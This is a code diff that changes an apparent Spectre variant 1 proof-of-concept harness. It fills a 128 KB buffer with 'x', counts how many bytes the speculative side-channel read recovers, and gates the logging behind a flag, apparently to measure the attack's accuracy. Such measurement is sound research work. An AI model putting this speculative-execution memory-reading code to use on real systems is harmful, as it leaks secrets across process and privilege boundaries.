@@ -10,6 +10,7 @@
 * improve documentation where possible.
 *
 **********************************************************************/
+#include <string.h>
 
 #include <stdio.h>
 #include <stdlib.h>
@@ -279,12 +280,14 @@ int main(int argc,
   
   /* Default to a cache hit threshold of 80 */
   int cache_hit_threshold = 80;
-
+  int len = 128*1024;//40;
+  char * secret = malloc(128*1024);
+  memset(secret,'x',128*1024);
   /* Default for malicious_x is the secret string address */
   size_t malicious_x = (size_t)(secret - (char * ) array1);
   
   /* Default addresses to read is 40 (which is the length of the secret string) */
-  int len = 40;
+  
   
   int score[2];
   uint8_t value[2];
@@ -356,18 +359,22 @@ int main(int argc,
   printf("\n");
 
   printf("Reading %d bytes:\n", len);
-
+  int nBytesReadCorrectly = 0;
   /* Start the read loop to read each address */
   while (--len >= 0) {
+#if PRINT_LOG
     printf("Reading at malicious_x = %p... ", (void * ) malicious_x);
-
+#endif
     /* Call readMemoryByte with the required cache hit threshold and
        malicious x address. value and score are arrays that are
        populated with the results.
     */
     readMemoryByte(cache_hit_threshold, malicious_x++, value, score);
-
+    if (value[0] == 'x') {
+      nBytesReadCorrectly++;
+    }
     /* Display the results */
+#if PRINT_LOG
     printf("%s: ", (score[0] >= 2 * score[1] ? "Success" : "Unclear"));
     printf("0x%02X=’%c’ score=%d ", value[0],
       (value[0] > 31 && value[0] < 127 ? value[0] : '?'), score[0]);
@@ -378,6 +385,9 @@ int main(int argc,
     }
 
     printf("\n");
+#endif
   }
+  
+  fprintf (stderr, "nBytesReadCorrectly %ld\n", nBytesReadCorrectly);
   return (0);
 }
